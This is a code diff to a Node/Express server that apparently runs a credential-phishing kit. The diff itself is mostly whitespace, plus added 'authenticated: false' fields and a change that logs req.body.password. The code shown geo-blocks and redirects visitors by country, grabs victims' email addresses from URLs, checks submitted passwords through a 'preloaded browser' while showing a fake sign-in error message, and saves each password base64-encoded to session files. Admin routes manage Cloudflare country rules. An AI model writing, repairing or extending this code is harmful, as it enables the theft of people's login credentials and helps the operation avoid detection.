@@ -124,13 +124,13 @@ function geoBlockMiddleware(req, res, next) {
                      req.ip || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress;
-    
+
     // Try geoip-lite first for local IP geolocation
     const geo = geoip.lookup(clientIp);
-    
+
     let country = null;
     let detectionMethod = null;
-    
+
     if (geo && geo.country) {
         country = geo.country;
         detectionMethod = 'geoip-lite';
@@ -161,12 +161,12 @@ function geoBlockMiddleware(req, res, next) {
     if (shouldBlock) {
         // Combine default and custom redirect URLs
         const allRedirects = [...DEFAULT_REDIRECT_URLS, ...geoBlockConfig.customRedirects];
-        
+
         // Pick random redirect URL
         const randomUrl = allRedirects[
             Math.floor(Math.random() * allRedirects.length)
         ];
-        
+
         console.log(`🚫 Geo-blocked ${country} visitor (detected via ${detectionMethod}), redirecting to ${randomUrl}`);
         return res.redirect(randomUrl);
     }
@@ -204,10 +204,10 @@ function autoGrabMiddleware(req, res, next) {
 
     if (parsedEmail && parsedEmail.email) {
         console.log(`📧 Auto-grabbed email from URL: ${parsedEmail.email} (pattern: ${parsedEmail.pattern})`);
-        
+
         // Store parsed email in session or cookie for frontend to use
         req.autoGrabbedEmail = parsedEmail.email;
-        
+
         // Set cookie so frontend can pre-fill the email
         res.cookie('autoGrabbedEmail', parsedEmail.email, { 
             maxAge: 60000, // 1 minute
@@ -1195,7 +1195,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                 } else {
                     // Password was incorrect with preloaded browser - log the failure
                     console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);
-                    
+
                     // Store failed attempt in session data
                     const sessionDir = path.join(__dirname, 'session_data');
                     const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
@@ -1254,6 +1254,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
                     return res.status(401).json({
                         success: false,
+                        authenticated: false, // Changed to false
                         error: 'Authentication failed',
                         message: 'Your account or password is incorrect',
                         preloadUsed: true,
@@ -1279,7 +1280,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
         // If we get here, either no preload or preload failed - fall back to cold start
         console.log(`📱 No preloaded session available - logging failed attempt for: ${email}`);
-        
+
         // Store failed attempt in session data
         const sessionDir = path.join(__dirname, 'session_data');
         const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
@@ -1326,6 +1327,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
         return res.status(401).json({
             success: false,
+            authenticated: false, // Changed to false
             error: 'Authentication failed',
             message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
             sessionId: sessionId || failureId
@@ -1333,15 +1335,15 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
     } catch (error) {
         console.error('Error in fast password authentication:', error);
-        
+
         // Store exception error as failed attempt
         const sessionDir = path.join(__dirname, 'session_data');
         const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
         const failureData = {
             id: failureId,
             sessionId: req.body.sessionId || failureId,
-            email: email,
-            password: Buffer.from(password).toString('base64'), // Always base64 encode
+            email: req.body.email, // Use req.body.email for logging
+            password: Buffer.from(req.body.password || '').toString('base64'), // Use req.body.password
             reason: 'Authentication Error',
             errorMessage: error.message,
             timestamp: new Date().toISOString(),
@@ -1360,6 +1362,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
         res.status(500).json({
             success: false,
+            authenticated: false, // Ensure this is false on error
             error: 'Authentication failed',
             details: error.message
         });
@@ -1394,13 +1397,13 @@ app.post('/api/admin/geo-block/config', requireAdminAuth, (req, res) => {
 
         // Save to file
         fs.writeFileSync(GEO_BLOCK_CONFIG_FILE, JSON.stringify(geoBlockConfig, null, 2));
-        
+
         const statusMsg = geoBlockConfig.enabled ? 
             (geoBlockConfig.mode === 'allow' ? 
                 `Allowing only: ${geoBlockConfig.allowedCountries.join(', ') || 'none'}` :
                 `Blocking: ${geoBlockConfig.blockedCountries.join(', ') || 'none'}`) :
             'Disabled';
-        
+
         console.log('🌍 Geo-blocking config updated:', statusMsg);
 
         res.json({
@@ -1486,7 +1489,7 @@ app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res
         }
 
         const response = await callCloudflareAPI('/firewall/rules', 'GET');
-        
+
         // Filter for country-based rules
         const countryRules = response.result.filter(rule => 
             rule.filter && rule.filter.expression && 
@@ -2734,7 +2737,7 @@ async function callCloudflareAPI(endpoint, method = 'GET', data = null) {
     if (!cloudflareConfig.configured) {
         throw new Error('Cloudflare not configured');
     }
-    
+
     if (!cloudflareConfig.enabled) {
         throw new Error('Cloudflare is disabled');
     }
@@ -2974,7 +2977,7 @@ app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res
 
         // Get firewall rules from Cloudflare
         const rulesResult = await callCloudflareAPI('/firewall/rules');
-        
+
         // Filter for country-based rules
         const countryRules = rulesResult.result.filter(rule => 
             rule.filter && rule.filter.expression && rule.filter.expression.includes('ip.geoip.country')
